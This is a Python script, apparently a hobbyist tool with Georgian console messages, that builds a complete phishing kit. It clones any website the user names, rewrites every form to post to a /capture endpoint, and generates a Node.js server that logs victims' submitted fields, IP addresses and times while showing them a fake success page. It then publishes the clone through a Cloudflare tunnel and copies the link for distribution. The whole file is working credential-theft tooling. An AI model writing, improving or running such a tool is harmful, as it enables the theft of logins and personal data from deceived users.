import os
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import json
import time
import random
import sys
import subprocess
import shutil  


GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'


def print_banner():
    
    NEON = '\033[92m'           
    BRIGHT = '\033[38;5;118m'   
    DIM = '\033[38;5;22m'       
    RESET = '\033[0m'

    
    lines = [
        " ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ",
        " ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗",
        " ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝",
        " ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗",
        " ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║",
        " ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    ]

    print("\n" * 2)

    
    for _ in range(5):
        for line in lines:
            glitch_line = ''
            for char in line:
                if char == ' ':
                    glitch_line += ' '
                    continue
                
                if random.random() < 0.3:
                    color = random.choice([DIM, BRIGHT, NEON, RESET + NEON])
                else:
                    color = NEON
              
                end_color = NEON if color != RESET + NEON else ''
                glitch_line += f"{color}{char}{end_color}"
            print(glitch_line + RESET)
        time.sleep(0.12)
       
        sys.stdout.write(f"\033[{len(lines)}A")
        sys.stdout.flush()


    for line in lines:
        print(f"{NEON}{line}{RESET}")
    
    print(f"{BLUE}             WEBSITE CLONER + AUTO PHISH SERVER{RESET}")
    print(f"{BLUE}                         -ALEQSEI{RESET}")
    print()


def clone_website(url, output_dir):
    print(f"{YELLOW}[+] კლონირება: {url}{RESET}")
    os.makedirs(output_dir, exist_ok=True)

    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(url, timeout=15, headers=headers)
        response.raise_for_status()
    except Exception as e:
        print(f"{RED}[!] ვებგვერდი: {e}{RESET}")
        return False, None

    soup = BeautifulSoup(response.text, 'html.parser')
    base_url = url

    for script in soup.find_all('script'):
        script.decompose()
    print(f"{GREEN}[+] JS ამოღებულია{RESET}")

    html_path = os.path.join(output_dir, "index.html")
    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(str(soup))
    print(f"{GREEN}[+] HTML: {html_path}{RESET}")

    download_assets(soup, base_url, output_dir)
    update_html_links(soup, base_url, output_dir)

    for form in soup.find_all('form'):
        form['action'] = '/capture'
        if 'method' not in form.attrs:
            form['method'] = 'POST'
    print(f"{GREEN}[+] ფორმები: /capture{RESET}")

    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(str(soup))
    print(f"{GREEN}[+] HTML განახლებული{RESET}")

    return True, soup


def download_assets(soup, base_url, output_dir):
    assets = []
    base_parsed = urlparse(base_url)

    for link in soup.find_all('link', href=True):
        if link.get('rel') and 'stylesheet' in link.get('rel'):
            assets.append(link['href'])
        elif 'icon' in ''.join(link.get('rel', [])):
            assets.append(link['href'])
        elif any(x in link['href'].lower() for x in ['.woff', '.ttf', '.otf']):
            assets.append(link['href'])

    for script in soup.find_all('script', src=True):
        assets.append(script['src'])

    for img in soup.find_all('img', src=True):
        assets.append(img['src'])
    for src in soup.find_all('source', srcset=True):
        assets.append(src['srcset'].split(',')[0].strip().split(' ')[0])

    for asset_url in assets:
        full_url = urljoin(base_url, asset_url)
        parsed = urlparse(full_url)
        if parsed.netloc != base_parsed.netloc:
            continue

        local_path = os.path.join(output_dir, parsed.path.lstrip('/').split('?')[0])
        os.makedirs(os.path.dirname(local_path), exist_ok=True)

        if os.path.exists(local_path):
            continue

        try:
            print(f"{BLUE}[↓] {asset_url}{RESET}")
            r = requests.get(full_url, timeout=10)
            r.raise_for_status()
            with open(local_path, 'wb') as f:
                f.write(r.content)
        except:
            pass


def update_html_links(soup, base_url, output_dir):
    base_parsed = urlparse(base_url)
    for tag in soup.find_all(['link', 'script', 'img', 'source'], True):
        attr = 'href' if tag.name in ['link', 'source'] else 'src'
        if attr not in tag.attrs:
            continue
        old = tag[attr]
        full = urljoin(base_url, old)
        p = urlparse(full)
        if p.netloc == base_parsed.netloc:
            tag[attr] = p.path.lstrip('/') + ('?' + p.query if p.query else '')

    for tag in soup.find_all(srcset=True):
        parts = tag['srcset'].split(',')
        new_parts = []
        for part in parts:
            src = part.strip().split(' ')[0]
            full = urljoin(base_url, src)
            p = urlparse(full)
            if p.netloc == base_parsed.netloc:
                new_parts.append(p.path.lstrip('/') + part[len(src):])
            else:
                new_parts.append(part)
        tag['srcset'] = ', '.join(new_parts)


def extract_label_map(soup):
    label_map = {}
    inputs = soup.find_all(['input', 'select', 'textarea'], {'name': True})

    for field in inputs:
        name = field.get('name')
        label_text = None

        if 'id' in field.attrs:
            label = soup.find('label', attrs={'for': field['id']})
            if label:
                label_text = ' '.join(label.stripped_strings).strip()

        if not label_text:
            pl = field.find_parent('label')
            if pl:
                texts = [t.strip() for t in pl.contents if isinstance(t, str) and t.strip()]
                texts += [t.get_text(strip=True) for t in pl.find_all(recursive=False) if t.name != field.name]
                label_text = ' '.join(filter(None, texts)).strip()

        if not label_text:
            label_text = field.get('aria-label') or field.get('placeholder') or field.get('title')
            if label_text:
                label_text = label_text.strip()

        if not label_text:
            for sib in [field.find_previous_sibling(), field.find_next_sibling()]:
                if sib and sib.name in ['div', 'span', 'p', 'strong']:
                    t = sib.get_text(strip=True)
                    if t and len(t) < 50:
                        label_text = t
                        break

        if not label_text:
            label_text = re.sub(r'([a-z0-9])([A-Z])', r'\1 \2', name)
            label_text = re.sub(r'[_-]+', ' ', label_text).strip().capitalize()

        if label_text:
            label_text = re.sub(r'\s*\*|\s*[:：]\s*$', '', label_text).strip()
            if label_text:
                label_map[name] = label_text

    return label_map


def generate_server_js(output_dir, label_map):
    labels_json = json.dumps(label_map, ensure_ascii=False, indent=2)
    success_html = '<!DOCTYPE html><html lang="ka"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>მონაცემები მიღებულია</title><style>body{font-family:system-ui;background:#f0f2f5;margin:0;padding:40px 20px}.card{max-width:420px;margin:0 auto;background:white;border-radius:12px;padding:32px;box-shadow:0 2px 12px rgba(0,0,0,0.1);text-align:center}h2{color:#1c1e21;margin-bottom:12px}p{color:#606770;font-size:15px}.footer{font-size:12px;color:#8a8d91;margin-top:32px}</style></head><body><div class="card"><h2>მონაცემები მიღებულია!</h2><p>თქვენი ინფორმაცია უსაფრთხოდ შენახულია.</p><div class="footer">© 2025</div></div></body></html>'

    server_js = f"""const http = require('http');
const qs = require('querystring');
const fs = require('fs');
const path = require('path');
const {{ exec }} = require('child_process');

process.on('SIGINT', () => {{
  console.log('\\n\\x1b[91mგაჩერება...\\x1b[0m');
  process.exit();
}});

const labels = {labels_json};

const server = http.createServer((req, res) => {{
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '—';
  const time = new Date().toLocaleString('ka-GE');

  if (req.method === 'GET') {{
    let filePath = path.join(__dirname, req.url === '/' ? 'index.html' : '.' + req.url);
    if (!fs.existsSync(filePath)) {{ res.writeHead(404); res.end(); return; }}
    const ext = path.extname(filePath).toLowerCase();
    const mime = {{ '.html':'text/html', '.css':'text/css', '.js':'application/javascript', '.png':'image/png', '.jpg':'image/jpeg', '.svg':'image/svg+xml', '.woff':'font/woff', '.woff2':'font/woff2', '.ttf':'font/ttf', '.ico':'image/x-icon' }}[ext] || 'application/octet-stream';
    fs.readFile(filePath, (err, data) => {{ if (err) {{ res.writeHead(500); res.end(); return; }} res.writeHead(200, {{ 'Content-Type': mime + '; charset=utf-8' }}); res.end(data); }});
    return;
  }}

  if (req.method === 'POST' && req.url === '/capture') {{
    let body = '';
    req.on('data', c => body += c.toString());
    req.on('end', () => {{
      const data = qs.parse(body);
      console.log('\\n\\x1b[92mPOST CAPTURE\\x1b[0m');
      console.log('   IP: ' + ip);
      console.log('   Time: ' + time);
      console.log('   ————————————————');
      for (const k in data) {{
        const l = labels[k] || k;
        console.log(`   ${{l}}: \\x1b[92m${{data[k]}}\\x1b[0m`);
      }}
      console.log('   ————————————————\\n');
      res.writeHead(200, {{ 'Content-Type': 'text/html; charset=utf-8' }});
      res.end(`{success_html}`);
    }});
    return;
  }}

  res.writeHead(404); res.end();
}});

function startTunnel() {{
  const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');
  if (!fs.existsSync(cloudflaredPath)) {{
    console.log('\\x1b[91m[!] cloudflared.exe არ მოიძებნა! ჩააგდე ფოლდერში!\\x1b[0m');
    return;
  }}

  console.log('\\x1b[93mCloudflare Tunnel იწყება...\\x1b[0m');
  const p = exec(`"${{cloudflaredPath}}" tunnel --url http://localhost:3000`, {{
    cwd: __dirname,
    shell: true,
    windowsHide: true
  }});

  p.stdout.on('data', d => {{
    const line = d.toString();
    process.stdout.write(line);
    const m = line.match(/https:\\/\\/[^\\s]+\\.trycloudflare\\.com/);
    if (m) {{
      const url = m[0];
      console.log(`\\n\\x1b[92mTUNNEL LINK: ${{url}}\\x1b[0m`);
      exec(`echo ${{url}} | clip`, {{ shell: true }});
    }}
  }});

  p.stderr.on('data', d => process.stderr.write(d));
}}

server.listen(3000, '0.0.0.0', () => {{
  console.log('\\x1b[91mRUNNING: http://localhost:3000\\x1b[0m');
  startTunnel();
}});
"""

    server_path = os.path.join(output_dir, "server.js")
    with open(server_path, 'w', encoding='utf-8') as f:
        f.write(server_js)
    print(f"{GREEN}[+] server.js შექმნილი{RESET}")
    return server_path


def copy_cloudflared_to_clone(output_dir):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    src = os.path.join(script_dir, "cloudflared.exe")
    dst = os.path.join(output_dir, "cloudflared.exe")

    if os.path.exists(src):
        shutil.copy2(src, dst)
        print(f"{GREEN}[+] cloudflared.exe → {output_dir}/cloudflared.exe{RESET}")
    else:
        print(f"{YELLOW}[!] cloudflared.exe არ მოიძებნა! ჩააგდე: {script_dir}/cloudflared.exe{RESET}")


def start_server_in_new_window(dir_name):
    print(f"\n{GREEN}[+] სერვერი იწყება ავტომატურად...{RESET}")
    time.sleep(2)
    cmd = f'start "PHISH SERVER" cmd /c "cd /d \"{os.path.abspath(dir_name)}\" && node server.js && pause"'
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"{GREEN}[+] სერვერის ფანჯარა გახსნილია!{RESET}")
        print(f"   → {os.path.abspath(dir_name)}")
    except Exception as e:
        print(f"{RED}[!] სერვერის გაშვება ვერ მოხერხდა: {e}{RESET}")


if __name__ == "__main__":
    print_banner()
    target = input(f"{YELLOW}URL: {RESET}").strip()
    if not target.startswith("http"):
        target = "https://" + target

    dir_name = "cloned_" + re.sub(r'\W+', '_', urlparse(target).netloc)
    success, soup = clone_website(target, dir_name)
    if not success:
        exit(1)

    copy_cloudflared_to_clone(dir_name)

    label_map = extract_label_map(soup)
    print(f"{GREEN}[+] {len(label_map)} ველი ამოიღო{RESET}")
    generate_server_js(dir_name, label_map)

    print(f"\n{GREEN}მზადაა!{RESET}")
    print(f"   → კლონი: {os.path.abspath(dir_name)}")

    start_server_in_new_window(dir_name)

    print(f"\n{YELLOW}დახურვა 10 წამში...{RESET}")
    time.sleep(10)